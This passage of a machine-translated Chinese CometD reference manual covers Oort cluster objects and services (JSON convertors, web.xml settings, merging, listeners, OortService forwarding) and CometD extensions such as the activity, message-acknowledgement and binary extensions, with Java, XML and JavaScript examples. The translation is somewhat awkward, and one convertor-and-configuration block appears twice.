	    public void toJSON(Object obj, JSON.Output out) {
	        UserInfo userInfo = (UserInfo)obj;
	        out.addClass(UserInfo.class);
	        out.add("id", userInfo.getId());
	    }
	
	    @Override
	    public Object fromJSON(Map object) {
	        String id = (String)object.get("id");
	        return new UserInfo(id);
	    }
	}

类UserInfoConvertor依赖于Jetty JSON库; 可以为Jackson库编写类似的类（请参阅JSON部分以获取更多信息）。

最后，您必须在web.xml文件中指定MyCustomJSONContextClient类作为Oort配置的jsonContext参数（如Oort公共配置部分中所述），例如：

	<web-app ... >
	    ...
	    <servlet>
	        <servlet-name>oort-config</servlet-name>
	        <servlet-class>org.cometd.oort.OortMulticastConfigServlet</servlet-class>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://localhost:8080/cometd</param-value>
	        </init-param>
	        <init-param>
	            <param-name>oort.secret</param-name>
	            <param-value>oort_secret</param-value>
	        </init-param>
	        <init-param>
	            <param-name>jsonContext</param-name>
	            <param-value>com.acme.MyCustomJSONContextClient</param-value>
	        </init-param>
	        <load-on-startup>2</load-on-startup>
	    </servlet>
	    ...
	</web-app>

同样，为了正确反序列化UserInfo的实例，您必须再次配置CometD，如Oort JSON配置部分所述。 这是通过创建JSONContext.Server的自定义实现完成的：

	package com.acme;
	
	import org.cometd.server.JettyJSONContextServer;
	
	public class MyCustomJSONContextServer extends JettyJSONContextServer {
	    public MyCustomJSONContextServer() {
	        getJSON().addConvertor(UserInfo.class, new UserInfoConvertor());
	    }
	}

在上面的示例中，通过扩展CometD类JettyJSONContextClient隐式选择了Jetty JSON库。 Jackson JSON库存在类似的类。 在上面的类中，UserInfo类的转换器被添加到通过getJSON（）获取的根org.eclipse.jetty.util.ajax.JSON对象中。 这个根JSON对象是负责CometD消息序列化的对象。

转换器的典型实现可能是（假设你的UserInfo类有一个id属性）：
	
	import java.util.Map;
	import org.eclipse.jetty.util.ajax.JSON;
	
	public class UserInfoConvertor implements JSON.Convertor {
	    @Override
	    public void toJSON(Object obj, JSON.Output out) {
	        UserInfo userInfo = (UserInfo)obj;
	        out.addClass(UserInfo.class);
	        out.add("id", userInfo.getId());
	    }
	
	    @Override
	    public Object fromJSON(Map object) {
	        String id = (String)object.get("id");
	        return new UserInfo(id);
	    }
	}

类UserInfoConvertor依赖于Jetty JSON库; 可以为Jackson库编写类似的类（请参阅JSON部分以获取更多信息）。

最后，您必须在web.xml文件中指定MyCustomJSONContextClient类作为Oort配置的jsonContext参数（如Oort公共配置部分中所述），例如：

	<web-app ... >
	    ...
	    <servlet>
	        <servlet-name>oort-config</servlet-name>
	        <servlet-class>org.cometd.oort.OortMulticastConfigServlet</servlet-class>
	        <init-param>
	            <param-name>oort.url</param-name>
	            <param-value>http://localhost:8080/cometd</param-value>
	        </init-param>
	        <init-param>
	            <param-name>oort.secret</param-name>
	            <param-value>oort_secret</param-value>
	        </init-param>
	        <init-param>
	            <param-name>jsonContext</param-name>
	            <param-value>com.acme.MyCustomJSONContextClient</param-value>
	        </init-param>
	        <load-on-startup>2</load-on-startup>
	    </servlet>
	    ...
	</web-app>

同样，为了正确反序列化UserInfo的实例，您必须再次配置CometD，如Oort JSON配置部分所述。 这是通过创建JSONContext.Server的自定义实现完成的：
	
	package com.acme;
	
	import org.cometd.server.JettyJSONContextServer;
	
	public class MyCustomJSONContextServer extends JettyJSONContextServer {
	    public MyCustomJSONContextServer() {
	        getJSON().addConvertor(UserInfo.class, new UserInfoConvertor());
	    }
	}

和以前一样，通过扩展CometD类JettyJSONContextServer隐式选择了Jetty JSON库。 Jackson JSON库存在类似的类。 类UserInfoConvertor与上面定义的类相同，因此它用于序列化和反序列化。

您必须在web.xml文件中指定MyCustomJSONContextServer类作为CometD配置的jsonContext参数（如服务器配置部分中所述），例如：

	<web-app ... >
	    ...
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.annotation.AnnotationCometDServlet</servlet-class>
	        <init-param>
	            <param-name>jsonContext</param-name>
	            <param-value>com.acme.MyCustomJSONContextServer</param-value>
	        </init-param>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    ...
	</web-app>

总而言之，OortStringMap的ConcurrentMap数据实体的序列化将以下列方式进行：ConcurrentMap是一个Map并且本地表示为JSON对象; UserInfo值将按照UserInfoConvertor.toJSON（...）方法的指定转换为JSON。

序列化后获得的JSON传输到其他节点。接收它的节点会将接收到的JSON反序列化为包含由UserInfoConvertor.fromJSON（...）方法指定的已转换的UserInfo值对象的普通Map。最后，简单的Map对象将被传递给Oort对象工厂（另请参阅OortObjects创建部分）以转换为ConcurrentMap。

####9.7.1.5. OortObject数据实体合并

OortObject由部分组成，应用程序可能需要访问所有部分中包含的数据。在上面的示例中。、，应用程序可能希望能够从所有节点访问所有用户名。

为了从所有部分访问数据，OortObject提供了合并（OortObject.Merger合并）方法。应用程序可以使用org.cometd.oort.OortObjectMergers提供的合并或实现它们自己的合并，例如：

	OortList<String> names = ...;
	
	// Merge all the names from all the nodes
	List<String> allNames = names.merge(OortObjectMergers.listUnion());

合并是不涉及网络通信的本地操作：它只是合并OortObject中包含的所有数据实体部分。

####9.7.1.6. OortObject监听器

当一个节点更新其拥有的数据实体时，CometD通知其他节点，以便它们可以保持与执行更新的节点对应的数据实体部分保持同步。 应用程序可以注册侦听器以通知此类事件，并执行其自定义逻辑。

一个典型的例子是应用程序需要显示当前登录用户的总数。 每当用户连接并登录时，例如在NodeA中，需要通知NodeB更新连接到NodeB的用户的用户界面的总数。 在本例中使用的Oort对象是一个OortObject <Long>，但您希望在应用程序中使用CometD的内置org.cometd.oort.OortLong。

由于应用程序已经更新了NodeA中的OortObject <Long>，因此NodeB中的对应OortObject <Long>也会更新。 应用程序可以为这些事件注册一个侦听器，并更新用户界面：

	// At initialization time, create the OortObject and add the listener
	final OortObject<Long> userCount = new ...;
	userCount.addListener(new OortObject.Listener() {
	    public void onUpdated(OortObject.Info<T> oldInfo, OortObject.Info<T> newInfo) {
	        // The user count changed somewhere, broadcast the new value
	        long count = userCount.merge(OortObjectMergers.longSum());
	        broadcastUserCount(count);
	    }
	
	    public void onRemoved(OortObject.Info<T> info) {
	        // A node disappeared, broadcast the new user count
	        long count = userCount.merge(OortObjectMergers.longSum());
	        broadcastUserCount(count);
	    }
	
	    private void broadcastUserCount(long count) {
	        // Publish a message on "/user/count" to update the remote clients connected to this node
	        BayeuxServer bayeuxServer = userCount.getOort().getBayeuxServer();
	        bayeuxServer.getChannel("/user/count").publish(userCount.getLocalSession(), count);
	    }
	});

类org.cometd.oort.OortObject.Info表示OortObject的数据实体部分，并包含与它所代表的节点对应的数据实体和Oort URL。对于这个特定的例子，Info对象并不重要，因为你只对总用户数感兴趣，可以通过合并获得（参见OortObject合并部分）。但是，如果需要，可以使用它们来计算更新之前和之后的差异。

同样，OortMap支持在调用putAndShare（...）或removeAndShare（...）时OortMap条目发生更改时通知的OortMap.EntryListener的注册。 OortMap.EntryListener仅在更新地图条目时通知。要在整个地图由于对setAndShare（...）的调用而发生更改时得到通知，您可以使用OortMap.Listener（从OortObject继承），如上所述。在某些情况下，整个地图会更新，但您希望收到通知，就好像单个条目已更改一样;在这种情况下，您可以使用OortMap.DeltaListener，将整个地图更新转换为地图项更新。

OortList支持在调用addAndShare（...）或removeAndShare（...）时OortList元素发生更改时通知的OortList.ElementListener的注册。只有在更新列表元素时才会通知OortList.ElementListener。要在整个列表由于对setAndShare（...）的调用而发生更改时收到通知，您可以使用OortList.Listener（从OortObject继承），如上所述。在某些情况下，整个列表会更新，但您希望收到单个元素发生更改的通知;在这种情况下，您可以使用OortList.DeltaListener，将整个列表更新转换为列表元素更新。

####9.7.1.7. OortObjects同步限制

OortObject实例通过将数据实体发送到其他节点来同步它们的状态。

OortMap和OortList有一个内置的机制来同步整个对象，以防止入口更新（对于OortMap）或元素更新（对于OortList）过期。

当数据实体本身是一个大型复合对象时，同步整个对象的消息可能非常大。

我们来想象一个OortObject <List <String >>，或者等价的OortList <String>或者类似的OortStringMap <String>。在这些情况下，数据实体是一个可能包含数千个条目的集合，并且每个条目可能是一个大字符串。在整个集群中复制数据实体意味着必须发送非常大的消息（可能是MiB的顺序）。

Oort节点默认使用WebSocket传输来在节点间进行通信。根据Servlet容器提供的WebSocket实现，可能发生的限制是可以发送或接收的WebSocket消息大小。

如果应用程序存储大型数据实体，强烈建议以字节为单位估计数据实体的JSON表示的大小，并通过配置参数ws.maxMessageSize配置适当的WebSocket最大消息大小，如配置Java服务器部分。

Oort将为发送和接收WebSocket消息使用ws.maxMessageSize参数，以便可以毫无错误地复制大型数据实体。

Oort也可以配置为使用HTTP传输，它不具有这种限制，因此可以立即复制大型实体。

###9.7.2. OortService
org.cometd.oort.OortService是一个命名的CometD服务（另请参阅services部分），它将请求节点的操作转发到拥有必须执行操作的数据的集群中的节点（称为所有者节点）并接收返回的动作结果。

OortService建立在OortObject引入的概念上，即特定数据实体的所有权仅属于一个节点。任何节点都可以读取数据实体，但只有所有者才能创建/修改/删除它。为了执行修改数据实体的操作，节点必须知道拥有数据实体的节点是什么，然后将操作转发给所有者节点。 OortService提供了将操作转发给所有者节点并接收操作结果或其失败的功能。

类org.cometd.oort.OortService必须由应用程序分类以实现执行操作逻辑的关键方法。

OortService的典型工作流程如下：



- OortService从远程客户端接收消息。该消息包含OortService的足够信息，以所有者节点的Oort URL的形式确定哪个节点拥有必须应用该操作的数据。



- 一旦所有者节点Oort URL已知，OortService就可以通过调用方法forward（...）来转发操作，传递操作信息和不透明的上下文。所有者节点可以是从远程客户端自身接收消息的节点，并且应用程序不需要执行与所有者节点不同的情况。



- 该动作到达所有者节点，CometD在驻留在所有者节点上的OortService上调用onForward（...）方法，传递从第二步发送的动作信息。方法onForward（...）由应用程序执行以执行自定义逻辑，并可能返回成功结果或失败。



- 由onForward（...）返回的成功操作结果由CometD发送回请求节点，并且当它到达时，CometD调用onForwardSucceeded（...）方法，传递onForward（...）返回的操作结果。以及在第二步中传递给forward（...）方法的不透明上下文。方法onForwardSucceeded（...）由应用程序执行。



- 由onForward（...）返回的动作失败由CometD发送回请求节点，并且当它到达时，CometD调用onForwardFailed（...）方法，传入由onForward（...）返回的失败和不透明的上下文在第二步中传递给forward（...）方法。 onForwardFailed方法（...）由应用程序实现。

####9.7.2.1. OortService创建

OortService在群集中唯一命名，并且通常在启动时通过对它们进行子类化来创建。由于它们是CometD服务，因此通常会对其进行注释以在某些频道上侦听邮件（有关服务注释的更多详细信息，另请参阅注释的服务部分）：

		ServerAnnotationProcessor processor = ...;
		Oort oort = ...;
		
		// Create the service instance and process its annotations
		NameEditService nameEditService = new NameEditService(oort);
		processor.process(nameEditService);
	
	NameEditService的定义如下：
	
	@Service(NameEditService.NAME)
	public class NameEditService extends OortService<String, Boolean> {
	    public static final String NAME = "name_edit";
	
	    public NameEditService(Oort oort) {
	        super(oort, NAME);
	    }
	
	    // Lifecycle methods triggered by standard lifecycle annotations
	
	    @PostConstruct
	    public void construct() throws Exception {
	        start();
	    }
	
	    @PreDestroy
	    public void destroy() throws Exception {
	        stop();
	    }
	
	    // CometD's listener method on channel "/service/edit"
	
	    @org.cometd.annotation.Listener("/service/edit")
	    public void editName(final ServerSession remote, final ServerMessage message) {
	        // Step #1: remote client sends an action request.
	        // This runs in the requesting node.
	
	        // Find the owner Oort URL from the message.
	        // Applications must implement this method with their logic.
	        String ownerURL = findOwnerURL(message);
	
	        // Prepare the action data.
	        String oldName = (String)remote.getAttribute("name");
	        String newName = (String)message.getDataAsMap().get("name");
	        Map<String, Object> actionData = new HashMap<String, Object>();
	        actionData.put("oldName", oldName);
	        actionData.put("newName", newName);
	
	        // Step #2: forward to the owner node.
	        // Method forward(...) is inherited from OortService
	        forward(ownerURL, actionData, new ServerContext(remote, message));
	    }
	
	    @Override
	    protected Result<Boolean> onForward(Request request) {
	        // Step #3: perform the action.
	        // This runs in the owner node.
	
	        try {
	            Map<String, Object> actionData = request.getDataAsMap();
	            // Edit the name.
	            // Applications must implement this method.
	            boolean result = editName(actionData);
	
	            // Return the action result.
	            return Result.success(result);
	        } catch (Exception x) {
	            // Return the action failure.
	            return Result.failure("Could not edit name, reason: " + x.getMessage());
	        }
	    }
	
	    @Override
	    protected void onForwardSucceeded(Boolean result, ServerContext context) {
	        // Step #4: successful result.
	        // This runs in the requesting node.
	
	        // Notify the remote client of the result of the edit.
	        context.getServerSession().deliver(getLocalSession(), context.getServerMessage().getChannel(), result);
	    }
	
	    @Override
	    protected void onForwardFailed(Object failure, ServerContext context) {
	        // Step #5: failure result.
	        // This runs in the requesting node.
	
	        // Notify the remote client of the failure.
	        context.getServerSession().deliver(getLocalSession(), context.getServerMessage().getChannel(), failure);
	    }
	}

####9.7.2.2.OortMasterService

应用程序可能拥有任何节点自然拥有的数据实体。例如，在聊天应用程序中，聊天室可由任何节点中的用户创建，并由创建它的用户所连接的节点拥有。

但是，有些情况下，实体不能由任何节点拥有，而只能由一个节点拥有，通常称为主节点。此类实体的一个典型示例是生成唯一编号值的唯一（跨群集）ID生成器或访问存储以用于归档目的（例如文件系统或数据库）的服务，该服务仅在特定节点或必须执行特定实体的原子创建的服务（例如，唯一用户名）等。

CometD提供org.cometd.oort.OortMasterService，它可以被应用程序的子类编写服务，这些服务只对仅由单个节点拥有的数据实体执行操作。在每个节点中都有一个OortMasterService实例（与其他OortService实例类似），但其中只有一个是主节点。

CometD提供OortMasterService的即用型实现，org.cometd.oort.OortMasterLong，可用作跨集群号码生成器的唯一身份验证。

OortMasterService子类的实现类似于OortService（参见本节），但这次forward（...）始终使用与调用方法相同的Oort URL（主节点）调用OortMasterService.getMasterOortURL（）。

通过读取传递给命令行的系统属性，或者通过配置文件或其他类似的方式来确定节点是否为主节点。

###9.7.3. OortObject和OortService TradeOffs
一般来说，应用程序可以被看作是创建数据并对数据进行操作的程序。给定某个节点，应用程序可能需要访问存储在远程节点上的数据。对于数据的修改/删除操作，请使用OortService并将操作转发给所有者节点。但是，读取操作可以使用OortObject或使用OortService来执行。

当使用OortObject时，由于数据被复制到所有节点，因此读取操作是本地的，并且不涉及网络通信，所以您为更小的延迟交易更多的内存使用量以读取数据。

在使用OortService时，由于读取数据需要将操作转发给拥有数据的节点，并让拥有者节点将其发送回请求节点，因此您为了读取数据而交易较少的内存使用量，以便读取数据。

无论是使用一种解决方案还是其他解决方案，在很大程度上取决于应用程序，服务器机器规格（特别是可用内存），甚至可能随时间而改变。

例如，一个能够处理500个用户使用OortObject的用户群的用户信息的应用程序在增长到500,000个用户时可能无法这样做。同样，如果节点共同位于通过快速网络连接的同一数据中心，则可能值得使用OortService（因为网络时间可以忽略不计），但如果节点和地理位置分布（例如，在美国有一个节点在欧洲，一个在亚洲），那么网络时间可能成为一个问题，通过OortObject进行数据复制是一个更好的解决方案，可以最大限度地减少延迟。

10.扩展
=======
CometD实现包括添加/删除扩展的功能。扩展是CometD实现调用的函数;它允许您在收到消息之后但在消息处理的其余部分（传入扩展）之前或者在发送消息之前（传出扩展）修改消息。

扩展通常会向Bayeux协议规范定义的ext对象中发送或接收的消息添加字段。

扩展不是向业务字段添加消息的方式，而是处理所有消息的方式，包括Bayeux协议使用的元信息，以及扩展Bayeux协议本身。扩展应该解决与业务正交的问题，但是它会为应用程序提供价值。这种关注的典型例子是保证消息顺序，以保证消息传递，以确保如果用户导航到另一个CometD页面或在浏览器中重新加载相同的CometD页面，则使用相同的CometD会话而不必经过断开/握手周期，添加到每个消息元数据字段（如时间戳），检测客户端和服务器是否有时间偏移（例如，只有其中一个与NTP同步）等。

如果您没有这样的担忧或要求，则不应使用扩展，因为它们在不带来价值的情况下增加了最小开销。另一方面，如果您对您的业务有这样的正交关注（例如，对每条消息进行密码签名），则扩展是正确的做法。

您应该查看可用的扩展，了解它们提供的功能，并确定它们是否需要用于您的用例。如果您确实有一个正交的问题，并且扩展功能不可用，您可以按照以下指示编写自己的扩展程序。

通常你在客户端和服务器上设置扩展，因为客户端添加的字段通常需要服务器进行特殊处理，反之亦然;有可能扩展只是客户端或仅服务器端，但大多数时候客户端和服务器都需要它们。当扩展程序的行为不如预期时，通常是因为扩展程序在双方之一中缺失。

一个扩展有两组调用函数：传入函数（用于正在接收的消息）和传出函数（用于正在发送的消息）。传入函数以扩展注册顺序调用。传出函数以扩展注册反向顺序调用。在服务器上，BayeuxServer扩展总是在ServerSession扩展之前调用。

例如，给定这个代码：

	BayeuxServer bayeuxServer = ...;
	bayeuxServer.addExtension(new ExtensionA());
	bayeuxServer.addExtension(new ExtensionB());

那么对于传入的非元消息，呼叫顺序为：

	ExtensionA.rcv(...);
	ExtensionB.rcv(...);

而对于传出的非元消息，呼叫顺序为：

	ExtensionB.send(...);
	ExtensionA.send(...);

接下来的部分将介绍JavaScript CometD Extensions; 它们遵循便携式JavaScript CometD实现所使用的相同模式：扩展的可移植实现，并绑定了特定的JavaScript工具箱，目前是Dojo和jQuery。

10.1. 编写扩展
-------------
扩展是具有四个可选功能的JavaScript对象：



- 传出（消息） - 在消息发送之前调用



- 传入（消息） - 在收到消息之后立即调用



- 注册（名字，cometd） - 在分机注册时调用



- 未注册（） - 在扩展未注册时调用

这些功能是可选的; 您只能使用一个，或者两个，三个或全部。 如果他们在场，CometD会在适当的时候调用它们。

编写一个记录和计数长轮询的扩展很容易：您需要引用具有日志记录功能的cometd对象，并且只需要传出扩展功能：


	var LoggerExt = function() {
	    var _cometd;
	    var _counter;
	
	    this.registered = function(name, cometd) {
	        // Store the cometd object reference
	        _cometd = cometd;
	    };
	
	    this.outgoing = function(message) {
	        if (message.channel == '/meta/connect') {
	            // Log the long poll
	            _cometd._info('bayeux connect');
	
	            // Count the long polls
	            if (!message.ext) message.ext = {};
	            if (!message.ext.logger) message.ext.logger = {};
	            if (!message.ext.logger.counter) message.ext.logger.counter = 0;
	            message.ext.logger.counter = ++_counter;
	        }
	    };
	};

注意元消息也传递给扩展函数; 您通常必须通过查看通道或某些其他消息值来过滤扩展函数收到的消息。

另请注意，您可以通过添加字段来修改消息，通常在ext字段中。

>注意
>>注意不要覆盖ext字段，其他扩展名可能已经设置：检查它是否首先出现。 将扩展字段分组以避免与其他扩展冲突（在上面的示例中，唯一的字段计数器 - 分组在message.ext.logger对象中）也是一种很好的做法。

outgoing（）和incoming（）函数可以避免返回某些东西，或者返回消息本身（或另一个消息对象）。这意味着扩展已经处理了消息，因此其他扩展（如果存在）可以处理它，或者实现可以处理该消息（通过将消息发送到服务器 - 用于传出扩展 - 或通过通知侦听器 - 传入扩展） 。

如果扩展函数返回null，则应停止处理：其他扩展不处理该消息，并且CometD不会进一步处理它。 CometD不会将消息发送到服务器，也不会通知听众。

10.2.注册扩展
-------------
JavaScript CometD API定义了三个管理扩展的函数：



- registerExtension（名称，扩展名） - 用给定名称注册扩展名



- unregisterExtension（name） - 取消注册以给定名称注册的扩展名



- getExtension（name） - 获得对以前用给定名称注册的扩展的引用

按照上面的例子，你可以像这样注册扩展：


	cometd.registerExtension('loggerExt', new LoggerExt());

从现在开始，元连接消息被修改以携带来自上面示例扩展的计数器。

取消注册扩展名与此类似：

	cometd.unregisterExtension('loggerExt');

无法使用相同的名称注册两个扩展名。

10.3.扩展异常处理
---------------
尽管在扩展函数中捕获异常通常是一种很好的做法，但有时这很繁琐，无法控制扩展的质量（例如，它是第三方扩展）。 JavaScript CometD API提供了一种方法来定义全局扩展异常处理程序，每当扩展引发异常时（例如，在未定义的对象上调用函数），都会调用该异常处理程序：

	cometd.onExtensionException = function(exception, extensionName, outgoing, message) {
	    // Uh-oh, something went wrong, disable this extension
	    // Object "this" points to the CometD object
	    this.unregisterExtension(extensionName);
	
	    // If the message is going to the server, add the error to the message
	    if (outgoing) {
	        // Assume you have created the message structure below
	        var badExtension = message.ext.badExtensions[extensionName];
	        badExtension.exception = exception;
	    }
	}

要非常小心地使用CometD对象在扩展异常处理程序中发布消息，否则可能会以无限循环结束（扩展程序处理发布消息，这可能会失败并再次调用扩展异常处理程序）。 如果扩展异常处理程序本身抛出异常，则此异常会在“info”级别进行记录，并且CometD实现不会中断。

>注意
>>要了解有关侦听器和订阅者的类似机制，请参阅JavaScript库配置部分。

接下来的部分将详细解释CometD提供的扩展的用法。

10.4.活动扩展
------------
活动扩展监控服务器会话的活动，在可配置的非活动时间段后断开连接。这是由org.cometd.server.ext.ActivityExtension类实现的仅服务器端扩展。

此扩展非常有用，因为Bayeux协议（另请参阅Bayeux协议部分）使用心跳机制（通过/ meta / connect通道）阻止服务器声明资源，例如连接或传输会话（例如，Servlet的HttpSession）因为它们处于空闲状态，因此可以防止服务器长时间闲置时关闭或销毁资源。

一个具体的例子如下：当使用长轮询CometD传输时，心跳机制由对服务器的HTTP POST请求组成。即使CometD客户端完全闲置（例如，用户去吃午餐），心跳机制也会继续定期将POST发送到服务器。如果服务器的web.xml配置了一个<session-timeout>元素，这会在30分钟的不活动状态后破坏HttpSession，那么HttpSession将永远不会被销毁，因为心跳机制看起来像是对服务器的合法HTTP请求，它永远不会停止。服务器无法知道这些POST只是心跳。

ActivityExtension解决了这个问题。

ActivityExtension定义了两种不活动类型：



- 仅客户端不活动，其中客户端定期发送心跳消息但没有其他消息，而服务器可以向客户端发送正常消息



- 客户端 - 服务器不活动，其中客户端和服务器仅发送定期的心跳消息而没有其他消息。

###10.4.1. 启用扩展
要启用ActivityExtension，必须在初始化期间将扩展添加到BayeuxServer，指定要监视的活动类型以及以毫秒为单位的最大不活动时间段：

	bayeuxServer.addExtension(new ActivityExtension(ActivityExtension.Activity.CLIENT, 15 * 60 * 1000L));

上述示例将ActivityExtension配置为仅监视仅客户端活动，并在非活动状态15分钟（或15 * 60 * 1000 ms）后断开非活动客户端。

同样，要监视客户端 - 服务器活动：

	bayeuxServer.addExtension(new ActivityExtension(ActivityExtension.Activity.CLIENT_SERVER, 15 * 60 * 1000L));

上面的示例将ActivityExtension配置为监视客户端 - 服务器活动，并在非活动状态15分钟后断开非活动客户端的连接。

###10.4.2. 仅为特定ServerSession启用扩展
如果您想以相同的方式监控所有客户端的不活动状态，则可以安装org.cometd.server.ext.ActivityExtension。

可以通过不在BayeuxServer上安装ActivityExtension来监控特定客户端的非活动状态，并且可以在要监控其不活动状态的特定服务器会话上安装org.cometd.server.ext.ActivityExtension.SessionExtension，例如：

	public class MyPolicy extends DefaultSecurityPolicy {
	    @Override
	    public boolean canHandshake(BayeuxServer server, ServerSession session, ServerMessage message) {
	        if (!isAdminUser(session, message)) {
	            session.addExtension(new ActivityExtension.SessionExtension(ActivityExtension.Activity.CLIENT, 10 * 60 * 1000L));
	        }
	        return true;
	    }
	}

在上面的示例中，自定义SecurityPolicy（另请参阅服务器授权部分）将检查握手是否为管理员用户的握手，并仅为非管理员安装活动扩展，并且不活动超时时间为10分钟。

或者，您可以编写一个BayeuxServer扩展来选择性地安装ActivityExtension.SessionExtension：


	public class MyExtension extends BayeuxServer.Extension.Adapter {
	    @Override
	    public boolean sendMeta(ServerSession session, ServerMessage.Mutable message) {
	        if (Channel.META_HANDSHAKE.equals(message.getChannel()) && message.isSuccessful()) {
	            if (!isAdminUser(session, message)) {
	                session.addExtension(new ActivityExtension.SessionExtension(ActivityExtension.Activity.CLIENT, 10 * 60 * 1000L));
	            }
	        }
	        return true;
	    }
	}

在上面的示例中，自定义BayeuxServer扩展会检查握手是否成功，并仅为非管理员安装活动扩展，并且不活动超时时间为10分钟。

10.5.消息确认扩展
----------------
默认情况下，CometD不强制在服务器到客户端的消息传递上执行严格的顺序，也不保证客户端接收到服务器发送的消息。

消息确认扩展为Bayeux协议为从服务器发送到客户端的消息提供了消息排序和消息可靠性。此扩展需要客户端扩展和服务器端扩展。 Java中提供了服务器端扩展。如果您只对消息顺序感兴趣（而不是可靠性），请参阅订购部分。

###10.5.1.启用服务器端消息确认扩展
要启用对已确认消息的支持，您必须在初始化期间将扩展添加到org.cometd.bayeux.server.BayeuxServer实例中：

	bayeuxServer.addExtension(new org.cometd.server.ext.AcknowledgedMessagesExtension());

AcknowledgedMessageExtension是一个每服务器扩展，用于监视来自新远程客户端的握手，寻找那些也支持已确认消息扩展的握手，然后在握手处理期间将AcknowledgedMessagesClientExtension添加到ServerSession通信者到远程客户端。

一旦添加到ServerSession中，AcknowledgedMessagesClientExtension保证消息的有序传递，以及从服务器到客户端的未确认消息的重新发送。 该扩展还维护未确认消息的列表并拦截/ meta / connect通道上的通信以插入和检查确认ID。

###10.5.2.启用客户端消息确认扩展
dojox / cometd / ack.js为Dojo提供客户端扩展绑定，并且使用Dojo的require（）机制就足够了：

	require(["dojox/cometd", "dojox/cometd/ack"], function(cometd) {
	    ...
	});

上面的例子在使用jQuery的require（）语法时也是有效的。

jquery.cometd-ack.js文件为jQuery提供了客户端扩展绑定。 如果不使用require（）语法，则必须通过script标记将实现文件和jQuery扩展绑定包含在HTML页面中：

	<script type="text/javascript" src="AckExtension.js"></script>
	<script type="text/javascript" src="jquery.cometd-ack.js"></script>

在Dojo和jQuery扩展绑定中，扩展名都以默认的cometd对象的名称“ack”注册。

此外，可以通过设置cometd对象上的ackEnabled布尔字段来以编程方式禁用/启用扩展，然后再初始化：

	// Disables the ack extension during handshake
	cometd.ackEnabled = false;
	cometd.init(cometdURL);

###10.5.3.确认扩展详细信息
要启用消息确认，客户端和服务器都必须指明它们支持消息确认。这是握手期间协商的。在握手时，客户端发送{“ext”：{“ack”：“true”}}来表明它支持消息确认。如果服务器也支持消息确认，它也会以{“ext”：{“ack”：“true”}}回复。

该扩展插件不会在每条消息中插入确认ID，因为这会给发送给多个客户端的消息（这需要为每个客户端重新串行化为JSON）在服务器上造成很大的负担。相反，确认ID插入到与消息传递相关联的/ meta / connect消息的ext字段中。每个/ meta / connect请求都包含最后收到的ack响应的确认ID：“ext”：{“ack”：42}。同样，每个/ meta / connect响应都包含一个ext ack ID，用于唯一标识发送的一批响应。

如果接收到的a / meta / connect消息的ack ID低于扩展所保留的任何未确认消息，则这些消息会在最近排队的消息之前重新排队，并且/ meta / connect响应会使用新的ack ID发送。

需要注意的是，消息确认仅从服务器到客户端保证，而不是从客户端到服务器。这意味着ack扩展保证了服务器发送给客户端的消息将在发生消息丢失的临时网络故障的情况下重新发送。但是，不能保证客户端发送的消息将到达服务器。

###10.5.4.消息顺序
CometD默认不执行消息排序。 CometD服务器有两种方法将ServerSession队列中的消息传递给其对应的远程客户端：



- 通过/ meta / connect响应



- 通过直接回应

通过/ meta / connect响应传递意味着服务器将传递出现在ServerSession队列中的消息以及/ meta / connect响应，以便传递给远程客户端的消息为：[{/ meta / connect response message} ，{排队消息1}，{排队消息2}，...]。

直接交货取决于运输。

对于轮询传输，这意味着服务器将传递ServerSession队列中的消息以及当时正在处理的其他响应消息。例如，假设clientA已经订阅了channel / foo，并且它也想订阅channel / bar。然后，clientA向服务器发送订阅请求，并在处理订阅请求之前，服务器在channel / foo上收到一条消息，因此需要将消息发送给clientA（例如， clientB向channel / foo发布消息，或者外部系统在channel / foo上产生消息）。 channel / foo上的消息在clientA的`ServerSession中排队。但是，服务器注意到它必须回复针对/ bar的订阅请求，因此它在该响应中包含channel / foo上的消息，从而避免唤醒/ meta / connect，以便将消息传递到远程客户机是：[{订阅响应消息/ bar}，{排队消息在/ foo}]。

对于诸如websocket之类的非轮询传输，服务器将只传递存在于ServerSession队列中的消息而不唤醒/ meta / connect，因为非轮询传输可以发送服务器到客户端的消息，而不需要一个挂起的响应，“ServerSession”的排队消息被捎带。

这两种传递消息的方式彼此竞争，以最小的延迟传递消息。因此，服务器可能会从外部系统接收两个要发送给同一客户端的消息，例如先发送消息1，然后发送消息2; message1排队并立即通过直接递送出列，而message2排队，然后通过/ meta / connect递送出列。客户端可能会看到message2在message1之前到达，例如，因为服务器上的线程调度有利于message2的处理，或者因为message1的TCP通信在某种程度上放缓了（更不用说浏览器可能成为不确定性的来源）。

要仅启用服务器到客户端的消息排序（但不是可靠性），您需要使用metaConnectDeliverOnly参数配置服务器，如java服务器配置部分所述。

当启用服务器到客户端的消息排序时，所有消息都将通过元/连接响应传递。在上面的例子中，message1将被传送给客户端，message2将在服务器上等待，直到客户端发出另一个meta / connect（客户端收到message1后立即发生）。当服务器收到第二个元/连接请求时，它会立即做出响应并将message2传递给客户端。

很明显，服务器到客户端的消息排序是稍微增加了延迟的小代价（消息2必须等待下一个元/连接才能交付），并且服务器的活动稍微多一点（因为元/连接将被恢复比正常情况更频繁）。

###10.5.5.演示
在Dojo聊天演示中有一个与CometD发行版捆绑在一起的确认消息示例，以及如何在安装演示版块中运行CometD演示的说明。

要运行确认演示，请按照下列步骤操作：



1. 开始CometD

   		$ cd cometd-demo
		$ mvn jetty:run
2. 将浏览器指向http：// localhost：8080 / dojo-examples / chat /并确保选中启用可靠消息传递

3. 使用两个不同的浏览器实例开始聊天会话，然后短暂断开一个浏览器与网络的连接

4. 当一个浏览器断开连接时，在另一个浏览器中键入一些聊天，当断开连接的浏览器重新连接到网络时收到该聊天。

请注意，如果断开连接的浏览器断开超过maxInterval（默认10秒），则客户端超时并丢弃未确认的队列。

10.6.二进制扩展
----------------
二进制扩展允许应用程序发送和接收包含二进制数据的消息，因此可以上传和下载文件或图像等二进制数据。 此扩展需要客户端扩展和服务器端扩展。 Java中提供了服务器端扩展。

###10.6.1. 启用服务器端扩展
要启用对消息中的二进制数据的支持，您必须在初始化期间将扩展添加到org.cometd.bayeux.server.BayeuxServer实例中：

	bayeuxServer.addExtension(new org.cometd.server.ext.BinaryExtension());

###10.6.2.启用客户端扩展
dojox / cometd / binary.js为Dojo提供客户端扩展绑定，并且使用Dojo的dojo.require机制就足够了：

	require(["dojox/cometd", "dojox/cometd/binary"], function(cometd) {
	    ...
	});

